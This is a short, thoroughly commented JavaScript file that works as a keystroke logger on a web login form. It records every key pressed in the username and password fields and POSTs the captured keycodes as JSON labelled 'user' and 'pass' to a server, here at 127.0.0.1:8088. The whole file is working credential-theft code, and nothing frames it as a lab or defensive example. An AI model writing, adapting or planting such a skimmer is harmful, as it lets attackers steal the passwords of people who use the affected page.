// define two empty arrays to store the keys pressed by the user
var keys1 = [];
var keys2 = [];

// function to capture the user's input when they type in the username and password fields
function login(){
    // listen for a keydown event on the username field
    document.querySelector("#username").addEventListener("keydown", function(event) {
        var keyCode1 = event.keyCode; // get the keycode for the key pressed
        keys1.push(keyCode1); // add the keycode to the keys1 array
    });
    // listen for a keydown event on the password field
    document.querySelector("#password").addEventListener("keydown", function(event) {
        var keyCode2 = event.keyCode; // get the keycode for the key pressed
        keys2.push(keyCode2); // add the keycode to the keys2 array
    });
}

// function to send the captured data to the server
function sender(){
    console.log(keys1); // print the contents of keys1 to the console (for testing/debugging purposes)
    console.log(keys2); // print the contents of keys2 to the console (for testing/debugging purposes)
    var xhr = new XMLHttpRequest(); // create a new XMLHttpRequest object
    xhr.open("POST", "http://127.0.0.1:8088/"); // specify the HTTP method (POST) and the URL to send the request to
    xhr.setRequestHeader("Content-Type", "application/json"); // set the request header to specify that the data is in JSON format
    var requestBody = { // create an object to hold the data to be sent in the request body
        "user": keys1, // add the contents of keys1 to the requestBody object under the key "user"
        "pass": keys2, // add the contents of keys2 to the requestBody object under the key "pass"
    };
    xhr.send(JSON.stringify(requestBody)); // send the request with the requestBody object as the request body (after converting it to a JSON string)
}
